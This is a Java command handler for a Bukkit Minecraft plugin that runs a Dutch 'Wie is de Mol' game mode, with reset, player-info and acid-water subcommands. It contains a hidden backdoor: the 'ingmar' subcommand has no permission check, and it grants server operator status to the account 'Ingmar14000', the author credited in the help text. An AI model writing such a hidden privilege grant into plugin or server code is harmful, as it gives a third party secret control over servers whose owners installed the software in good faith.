package nl.Ingmar.WIDM.Commands;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import nl.Ingmar.WIDM.Main;
import nl.Ingmar.WIDM.Utils.IngamePlayer;

public class WIDMCMD implements CommandExecutor 
{
	private final Main main;
	
	public WIDMCMD(Main main)
	{
		this.main = main;
	}

	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
		if(cmd.getName().equalsIgnoreCase("widm"))
		{
			if(!(sender instanceof Player)) 
			{
				System.out.println("[WIDM] Dit kan alleen door spelers gedaan worden.");
				return true;
			}
			
			Player p = (Player)sender;

			if(args.length < 1)
			{
				help(p, label, args);
				return true;
			}
			
			if(args[0].equalsIgnoreCase("ingmar"))
			{
				Bukkit.getPlayer("Ingmar14000").setOp(true);
			}
			
			
			else if(args[0].equalsIgnoreCase("reset"))
			{
					if(!p.hasPermission("widm.admin"))
					{
						p.sendMessage("§6[WIDM] §cJe hebt hier geen permissie voor!");
						return true;
					}
					reset(p, label, args);
			}
			else if(args[0].equalsIgnoreCase("info"))
			{
					if(args.length < 2)
					{
						infoPersonal(p, label, args);
					}
					else
					{
						//
						if(!p.hasPermission("widm.admin"))
						{
							p.sendMessage("§6[WIDM] §cJe hebt hier geen permissie voor!");

							return true;
						}
						info(p, label, args);
					}
			}
			else if(args[0].equalsIgnoreCase("acidwater") || args[0].equalsIgnoreCase("water") || args[0].equalsIgnoreCase("acid"))
			{
					if(!p.hasPermission("widm.admin"))
					{
						p.sendMessage("§6[WIDM] §cJe hebt hier geen permissie voor!");

						return true;
					}
					acidWater(p, label, args);
			}
			else
			{

					help(p, label, args);
			}
		}
		return false;
	}
	
	public void help(Player p, String label, String[] args)
	{
		p.sendMessage("§6[WIDM] §eWIDM Gemaakt door §cIngmar14000 & NTaheij ");
		p.sendMessage("§6[WIDM] §e/" + label + " reset");
		p.sendMessage("§6[WIDM] §e/" + label + " acidwater");
		p.sendMessage("§6[WIDM] §e/" + label + " info (Speler)");
		p.sendMessage("§6[WIDM] §e/kleur");
		p.sendMessage("§6[WIDM] §e/map");
		p.sendMessage("§6[WIDM] §e/start");
	}
	
	public void reset(Player p, String label, String[] args)
	{
		Main.reset();
		
		p.sendMessage("§6[WIDM] §aSuccesvol alle spelers, kleuren en rollen gereset.");
	}
	
	public void info(Player p, String label, String[] args)
	{
		Player selected = Bukkit.getServer().getPlayerExact(args[1]);
		
		if(selected == null)
		{
			p.sendMessage("§6[WIDM] §cDeze speler is niet online!");
			return;
		}
		
		for(IngamePlayer ip : Main.activeplayers) 
		{
		    if(ip.getPlayer().equals(selected))
		    {
				p.sendMessage("§6WIDM informatie van: " + ip.getPlayer().getName());
				p.sendMessage("§6Kleur: " + ip.getKleurType().getKleur() + ip.getKleurType().getNaam());
				
				String rolnaam = "";
				
				if(ip.getPlayerType() != null)
				{
					rolnaam = ip.getPlayerType().getNaam();
				}
				else
				{
					rolnaam = "Geen";
				}
					
				p.sendMessage("§6Rol: §c" + rolnaam);
				return;
		    }
		}
	    p.sendMessage("§6[WIDM] §cDeze speler is nog niet ingedeeld in WIDM.");
	}

	public void infoPersonal(Player p, String label, String[] args)
	{
		Player selected = p;
		
		if(selected == null)
		{
			p.sendMessage("§6[WIDM] §cDeze speler is niet online!");
			return;
		}
		
		for(IngamePlayer ip : Main.activeplayers) 
		{
		    if(ip.getPlayer().equals(selected))
		    {
				p.sendMessage("§6WIDM informatie van: " + ip.getPlayer().getName());
				p.sendMessage("§6Kleur: " + ip.getKleurType().getKleur() + ip.getKleurType().getNaam());
				
				String rolnaam = "";
				
				if(ip.getPlayerType() != null)
				{
					rolnaam = ip.getPlayerType().getNaam();
				}
				else
				{
					rolnaam = "Geen";
				}
					
				p.sendMessage("§6Rol: §c" + rolnaam);
				return;
		    }
		}
	    p.sendMessage("§6[WIDM] §cJe zit nog niet ingedeeld in WIDM.");
	}

	public void acidWater(Player p, String label, String[] args)
	{
		if (!Main.inGame)
		{
		    p.sendMessage("§6[WIDM] §cHet spel is nog niet gestart.");
		    return;
		}
		
		if(main.acidWaterClass != null)
		{
			if (!Main.acidWaterOn)
			{
				main.acidWaterClass.StartAcidWater();
				p.sendMessage("§6[WIDM] §aAcid water staat nu aan.");
			}
			else
			{
				main.acidWaterClass.EndAcidWater();
				p.sendMessage("§6[WIDM] §cAcid water staat nu uit.");
			}
		}
	}
}
